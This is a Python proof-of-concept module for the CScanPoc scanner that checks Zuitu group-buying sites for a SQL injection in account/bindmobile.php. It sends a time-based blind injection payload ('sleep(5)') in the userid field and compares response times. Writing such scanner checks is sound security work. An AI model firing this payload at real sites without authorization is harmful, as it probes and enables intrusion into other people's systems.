# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time

class Vuln(ABVuln):
    vuln_id = 'Zuitu_0002' # 平台漏洞编号，留空
    name = '最土团购 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-07-23'  # 漏洞公布时间
    desc = '''
        最土团购，在include/library/DB.class.php(128-134):
        发现传递进来的参数，进行处理后变为$idstring ，在此期间 只是做了空格检测，并没有做其他特殊字符的过滤，然后直接进入查询，故而导致sql注入。
        辐射的文件有：

        account/bindmobile.php
        ajax/chargecard.php
        ajax/coupon.php
        api/call.php
        ......。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1884/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Zuitu(最土团购)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c3b17765-fe44-41a8-88c9-f4c06097de72'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-20'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = '/account/bindmobile.php'
            data_sleep = "userid=sssssssssssssssssssss',sleep(5))#"
            data_normal = "userid=sssssssssssssssssssss',1)#"
            url = self.target + payload
            time_start = time.time()
            requests.post(url, data=data_normal)
            time_end_normal = time.time()
            requests.post(url, data=data_sleep)
            time_end_sleep = time.time()
            
            if (time_end_sleep-time_end_normal) - (time_end_normal-time_start) > 4:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
